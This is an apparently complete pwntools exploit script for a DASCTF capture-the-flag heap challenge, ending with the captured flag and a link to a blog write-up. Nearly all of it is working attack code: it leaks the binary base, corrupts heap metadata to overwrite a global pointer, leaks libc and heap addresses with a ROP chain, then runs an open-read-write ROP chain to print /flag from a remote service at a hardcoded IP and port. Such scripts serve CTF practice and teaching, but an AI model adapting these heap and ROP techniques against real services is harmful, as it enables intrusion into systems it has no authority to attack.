#!/usr/bin/python3

from pwn import *

exe = ELF('pwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('48.218.22.35', 9991)
else:
    p = process(exe.path)
GDB()
p.recvuntil(b'gift: ')
exe.address = int(p.recvuntil(b'what do', drop=True), 16) - 0x4010
info("exe.address: " + hex(exe.address))


def cr(sz):
    sla(b'choice:\n', b'1')
    sla(b'need?', str(sz))


def ed(pa):
    sla(b'choice:\n', b'3')
    sa(b'story!\n', pa)


def de(idx, choice, idx2=0, pa='wan'):
    sla(b'choice:\n', b'2')
    sla(b'delete?', str(idx))
    sla(b'?(y/n)', choice)
    if choice == "y":
        sla(b' write?', str(idx2))
        sla(b'content: ', pa)


cr(0x4e0)
cr(0x100)
cr(0x4c0)
de(0, "n")
cr(0x500)
de(2, "y", 0, flat(0, 0, exe.sym.book - 0x20))
cr(0x500)

pop_rdi = exe.address + 0x1863
dest = exe.address + 0x4088
ed(flat(b'\0'*0x28, pop_rdi, exe.got.puts, exe.plt.puts,
        pop_rdi, dest, exe.plt.puts,
        exe.sym.edit_the_book))
libc.address = u64(p.recvline(keepends=False).ljust(8, b"\0")) - libc.sym.puts
heap = u64(p.recvline(keepends=False).ljust(8, b"\0"))
info("libc.adderss: " + hex(libc.address))
info("heap: " + hex(heap))

pop_rsi = libc.address + 0x000000000002be51  
pop_rdx = libc.address + 0x00000000000904a9  
pop_rax = libc.address + 0x0000000000045eb0  
syscall = libc.sym['getpid']+9
pa = b'/flag'.ljust(0x28, b'\x00')
pa += flat([pop_rdi, heap, 
            pop_rsi, 0, 
            pop_rax, 2, 
            syscall, 
            pop_rdi, 3, 
            pop_rsi, heap, 
            pop_rdx, 0x50, 0, 
            pop_rax, 0, 
            syscall, 
            pop_rdi, 1, 
            pop_rax, 1,
            syscall
            ])
sa(b'story!\n', pa)
p.interactive()
# DASCTF{1564519de61c72919826673861a1fd72}
# https://blog.csdn.net/weixin_52640415/article/details/140583481